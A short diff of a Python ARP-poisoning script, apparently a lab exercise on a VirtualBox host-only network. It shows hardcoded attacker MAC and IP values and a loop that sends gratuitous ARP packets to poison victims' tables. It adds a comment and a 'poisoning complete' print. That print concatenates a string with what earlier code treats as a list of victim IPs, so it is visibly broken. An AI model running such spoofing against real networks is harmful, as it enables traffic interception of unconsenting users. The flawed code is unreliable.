@@ -52,7 +52,7 @@ for i in range(inputNumber):
 
 print("You want to poision the arp tables of ", ipVictims)
 
-
+#shouldn't we make this automatic to make it work on multiple systems?
 macAttacker = "08:00:27:D0:25:4B"            
 ipAttacker = "192.168.56.103"
 
@@ -63,9 +63,4 @@ for i in range(len(ipVictims)):
     #spoofedPkt(macVictim, ipVictim, ipToSpoof)
     gratutiousARP(macVictim, ipVictim, ipToSpoof)
 
-
-
-
-
-
-
+print("ARP poisoning of: " + ipVictims + " complete!")
